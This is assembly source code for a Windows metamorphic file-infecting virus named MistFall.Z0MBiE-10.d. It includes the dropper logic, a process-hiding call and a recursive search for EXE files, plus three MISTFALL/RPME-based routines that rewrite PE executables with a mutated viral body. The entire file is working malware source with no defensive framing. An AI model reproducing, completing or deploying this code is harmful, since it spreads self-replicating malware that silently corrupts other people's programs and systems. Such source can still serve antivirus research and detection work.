
;----------------------------------------------------------------------------
;
; MistFall.Z0MBiE-10.d
;
;----------------------------------------------------------------------------
;
; syntax: z10d.exe <samplefile.exe>
;
;----------------------------------------------------------------------------

MAXBUFSIZE              equ     524288          ; 512K
MAXFILESIZE             equ     MAXBUFSIZE-65536
MAXMEM                  equ     02000000h       ; 32 MB
HEAP_ADD                equ     04000000h       ; 64 MB

;----------------------------------------------------------------------------

include                 INCLUDE\consts.inc
include                 INCLUDE\s2c.inc         ; asciiz->code conversion
include                 INCLUDE\mz.inc
include                 INCLUDE\pe.inc

include                 ENGINE\CODEGEN\cg_bin.ash      ; CODEGEN interface
include                 ENGINE\ETG\etg_bin.ash         ; ETG interface
include                 ENGINE\MISTFALL\mistfall.inc   ; MISTFALL interface
include                 ENGINE\RPME\rpme_asm.inc       ; RPME interface
include                 INCLUDE\seh.inc         ; SEH

; structure with all shared viral variables
v_data                  struc
;;
v_virsize               dd      ?               ; +0
v_virptr                dd      ?               ; +4
;;
v_ldeptr                dd      ?
v_memptr                dd      ?
v_memcount              dd      ?
v_randseed              dd      ?
v_bufptr                dd      ?
v_bufsize               dd      ?
v_saveebp               dd      ?               ; used by mutate
                        ends

;----------------------------------------------------------------------------

                        .386p
                        model   flat
                        locals  __
                        jumps
                        .data

;----------------------------------------------------------------------------

                        align   4
vir_start:
                        jmp     pe_entry

; common stuff
include                 INCLUDE\k32man.inc      ; kernel-api manager
include                 INCLUDE\recserch.inc    ; recursive file search
include                 INCLUDE\fioexlow.inc    ; file io
; mutation-related engines
include                 ENGINE\LDE32\lde32bin.inc      ; length-disassembler
include                 ENGINE\ETG\etg_bin.inc         ; ETG (trash generator)
include                 ENGINE\RPME\rpme-krn.inc       ; RPME -- kernel
include                 ENGINE\RPME\rpme-mut.inc       ; RPME -- mutator
include                 ENGINE\CODEGEN\cg_bin.inc      ; CODEGEN
include                 ENGINE\MISTFALL\mif_krn.inc    ; MISTFALL -- kernel
include                 ENGINE\MISTFALL\mif_mut1.inc   ; MISTFALL -- mutate, hooy
include                 ENGINE\MISTFALL\mif_mut2.inc   ; MISTFALL -- mutate, old-infect
; infection/permutation subroutines
include                 infect.inc              ; MISTFALL-based infector
include                 permut.inc              ; RPME-based mutator

pe_entry:
                        pushf
                        pusha

;                       x_push  edx, a|moment|in|a|million|years...צק~
;                       push    esp
;                       callX   OutputDebugStringA
;                       x_pop

                        ; check that there are enough physical memory
                        ; to avoid unexpected fuckup
                        sub     esp, 32-4       ; MEMORYSTATUS
                        push    32              ; .length
                        push    esp
                        callX   GlobalMemoryStatus
                        mov     eax, [esp+8]    ; .totalphys
                        add     esp, 32
                        cmp     eax, 16 shl 20  ; 16M at least
                        jb      __exit

                        ; check if we've started in the GUI-mode process,
                        ; 'coz re-executing console apps is sux
                        push    -11     ; STD_OUTPUT_HANDLE
                        callX   GetStdHandle
                        cmp     eax, -1
                        jne     __exit  ; handle should not exist

                        call    TryRunAsDropper

__exit:
                        popa
                        popf
                        retn

TryRunAsDropper:
                        x_push  eax, MistFallD~

                        ; dropper alredy installed?
                        push    esp
                        callX   GlobalFindAtomA
                        or      ax, ax
                        jnz     __exit

                        ; set viral atom
                        push    esp
                        callX   GlobalAddAtomA

                        ; run another copy of the process,
                        ; current copy became the dropper
                        sub     esp, 10h
                        mov     esi, esp
                        sub     esp, 44h
                        mov     edi, esp
                        push    edi
                        callX   GetStartupInfoA
                        push    esi             ; procinfo
                        push    edi             ; startupinfo
                        push    0               ; curdir
                        push    0               ; env
                        push    0               ; flags
                        push    1               ; inherithandles
                        push    0               ; process_attr
                        push    0               ; thread_attr
                        callX   GetCommandLineA
                        push    eax             ; offset cmdline
                        push    0               ; application
                        callX   CreateProcessA
                        add     esp, 10h+40h

                        seh_init

                        ; hide
                        calchash RegisterServiceProcess
                        push    hash
                        call    k32man_get_proc_address
                        or      eax, eax
                        jz      __skiphide
                        push    1
                        push    0
                        call    eax
__skiphide:

                        call    dropper_main

                        seh_done

                        push    -1
                        callX   ExitProcess

__exit:                 x_pop
                        retn

dropper_main:           sub     esp, size v_data        ; alloc v_data
                        mov     ebp, esp                ; *EBP = v_data

                        ; allocate place for LDE32' temporary buffer
                        push    2048
                        push    0
                        callX   GlobalAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_ldeptr, eax

                        ; allocate place for buffer with processing file
                        push    MAXBUFSIZE
                        push    0
                        callX   GlobalAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_bufptr, eax

                        ; MISTFALL's heap
                        push    MAXMEM
                        push    0
                        callX   GlobalAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_memptr, eax

                        ; initialize LDE32' 2K-buffer (unpack flags)
                        push    [ebp].v_ldeptr
                        call    disasm_init
                        add     esp, 4

                        ; randomize
                        callX   GetTickCount
                        xor     [ebp].v_randseed, eax

                        ; generate new permutated body
                        call    build_new_copy                  ; permut.inc

                        ; start recursive EXE file search
                        call    recsearch

__exit:                 add     esp, size v_data
                        retn

; my_malloc, my_disasm, my_random -- all passed to MISTFALL

; cdecl BYTE* malloc(v_data*,DWORD size)
;                    [esp+4]  [esp+8]
my_malloc:              mov     ecx, [esp+4]
                        mov     eax, [esp+8]    ; size
                        add     eax, 7
                        and     al, not 7
                        add     eax, [ecx].v_memcount
                        cmp     eax, MAXMEM
                        jae     __error
                        xchg    [ecx].v_memcount, eax
                        add     eax, [ecx].v_memptr
                        ;;
                        pusha
                        mov     edi, eax
                        mov     ecx, [esp+32+8]
                        add     ecx, 7
                        and     cl, not 7
                        shr     ecx, 2
                        xor     eax, eax
                        cld
                        rep     stosd
                        popa
                        ;;
                        retn
__error:                xor     eax, eax
                        retn

; LDE32 interface
; cdecl int disasm(v_data*, BYTE* opcode)
;                  [esp+4]  [esp+8]

my_disasm:              mov     eax, [esp+4]
                        push    dword ptr [esp+8]
                        push    [eax].v_ldeptr
                        call    disasm_main
                        add     esp, 8
                        retn

; cdecl int random(v_data*, DWORD range)
;                  [esp+4]  [esp+8]

my_random:              mov     ecx, [esp+4]            ; user_param
                        mov     eax, [ecx].v_randseed
                        imul    eax, 214013
                        add     eax, 2531011
                        mov     [ecx].v_randseed, eax
                        mov     ecx, [esp+8]            ; range
                        cmp     ecx, 65536
                        jb      __mul
                        push    edx
                        xor     edx, edx
                        div     ecx
                        xchg    edx, eax
                        pop     edx
                        retn
__mul:                  shr     eax, 16
                        imul    eax, ecx
                        shr     eax, 16
                        retn

; infect_file -- called from RECSERCH, when EXE file found

; input: EBP=v_data*
;        EDX=filename.EXE
;        EDI=ff_struc

infect_file:            pusha

;                       push    2
;                       push    ebp
;                       call    my_random
;                       add     esp, 8
;                       or      eax, eax
;                       jz      __exit

                        mov     [ebp].v_memcount, 0     ; initialize heap

                        cmp     [edi].ff_size, MAXFILESIZE
                        ja      __exit

                        mov     ecx, 32         ; set archive-attrib --
                        call    fsetattr        ; -- check if writeable
                        jc      __exit

                        call    fopen_ro        ; open in read-only mode
                        jc      __exit

                        xchg    ebx, eax

                        mov     edx, [ebp].v_bufptr     ; read into buffer
                        mov     ecx, MAXBUFSIZE         ;
                        call    fread                   ;
                        mov     [ebp].v_bufsize, eax    ;

                        call    fclose

                        mov     esi, [ebp].v_bufptr
                        cmp     [esi].mz_id, 'ZM'
                        jne     __exit

;                       cmp     [esi].byte ptr 1Ch, 'Z'  ; good work, Peter
;                       je      __exit
;                       mov     [esi].byte ptr 1Ch, 'Z'

                        mov     edi, [esi].mz_neptr
                        cmp     edi, [ebp].v_bufsize
                        jae     __exit
                        cmp     [esi+edi].pe_id, 'EP'
                        jne     __exit

                        ;;

                        push    20              ; .d -- 10-->20
                        push    ebp
                        call    my_random               ; random
                        add     esp, 8

                        dec     eax
                        jz      __infect_hooy

                        add     [esi+edi].pe_heapreservesize, HEAP_ADD

                        dec     eax
                        jz      __infect_wo_decr

                        ; method #1

__infect_my:            ; we need std file with DATA section to infect
                        cmp     [esi+edi+0F8h+28h*0].oe_flags, 0C0000040h
                        je      __good
                        cmp     [esi+edi+0F8h+28h*1].oe_flags, 0C0000040h
                        je      __good
                        cmp     [esi+edi+0F8h+28h*2].oe_flags, 0C0000040h
                        jne     __infect_wo_decr

__good:                 pusho   my_mutate                       ; infect.inc
                        pop     ebx

                        jmp     __infect_both

                        ; method #2

__infect_hooy:          pusho   mif_mutate1
                        pop     ebx

                        jmp     __infect_both

                        ; method #3

__infect_wo_decr:       pusho   mif_mutate2
                        pop     ebx
__infect_both:

                        ;;

                        seh_init

                        push    0                       ; sigman(), 0=unused
                        push    ebx                     ; mutate()
                        pusho   my_random
                        pusho   my_malloc
                        pusho   my_disasm
                        push    MAXBUFSIZE
                        lea     eax, [ebp].v_bufsize
                        push    eax                     ; &bufsize [OUT]
                        push    [ebp].v_bufsize         ; bufsize  [IN]
                        push    [ebp].v_bufptr          ; buf      [IN/OUT]
                        push    ebp                     ; v_data*
                        call    mif_kernel
                        add     esp, 10*4

                        seh_done
                        jc      __exit

                        cmp     eax, ERR_SUCCESS        ; 0=ERR_SUCCESS
                        jne     __exit

                        push    [esp].pusha_edx
                        callX   DeleteFileA

                        mov     edx, [esp].pusha_edx
                        call    fcreate
                        jc      __exit

                        xchg    ebx, eax

                        mov     edx, [ebp].v_bufptr     ; write infected file
                        mov     ecx, [ebp].v_bufsize    ;
                        call    fwrite                  ;

                        call    fclose

__exit:                 popa
                        retn

                        align   4
vir_size                equ     $-vir_start             ; thats all!

;----------------------------------------------------------------------------

db 13,10
db 13,10
db '------------------------------------',13,10
db 'virsize = '
db vir_size/10000 mod 10 + '0'
db vir_size/ 1000 mod 10 + '0'
db vir_size/  100 mod 10 + '0'
db vir_size/   10 mod 10 + '0'
db vir_size/    1 mod 10 + '0',13,10
db '------------------------------------',13,10
db 13,10
db 13,10

;----------------------------------------------------------------------------

                        align   4
x_ff_struc              ff_struc ?
                        align   4
x_filename              db      260 dup (?)

                        .code
loader_start:
                        callX   GetCommandLineA
                        xchg    esi, eax

                        mov     ah, 32
                        lodsb
                        cmp     al, '"'
                        jne     __cycle
                        mov     ah, '"'
__cycle:                lodsb
                        or      al, al
                        jz      __exit
                        cmp     al, ah
                        jne     __cycle

                        push    esi
                        push    offset x_filename
                        callX   lstrcpyA

                        push    offset x_ff_struc
                        push    offset x_filename
                        callX   FindFirstFileA
                        cmp     eax, -1
                        je      __exit

                        sub     esp, size v_data        ; alloc v_data
                        mov     ebp, esp                ; *EBP = v_data

                        ; allocate place for LDE32' temporary buffer
                        push    2048
                        push    0
                        callX   GlobalAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_ldeptr, eax

                        ; allocate place for buffer with processing file
                        push    MAXBUFSIZE
                        push    0
                        callX   GlobalAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_bufptr, eax

                        ; MISTFALL's heap
                        push    MAXMEM
                        push    0
                        callX   GlobalAlloc
                        or      eax, eax
                        jz      __exit
                        mov     [ebp].v_memptr, eax

                        ; initialize LDE32' 2K-buffer (unpack flags)
                        push    [ebp].v_ldeptr
                        call    disasm_init
                        add     esp, 4

                        ; randomize
                        callX   GetTickCount
                        xor     [ebp].v_randseed, eax

                        ; generate new permutated body
                        call    build_new_copy                  ; permut.inc

                        lea     edx, x_filename
                        lea     edi, x_ff_struc
                        call    infect_file

__exit:                 add     esp, size v_data

                        push    -1
                        extern  ExitProcess:PROC
                        call    ExitProcess

                        end     loader_start

;----------------------------------------------------------------------------
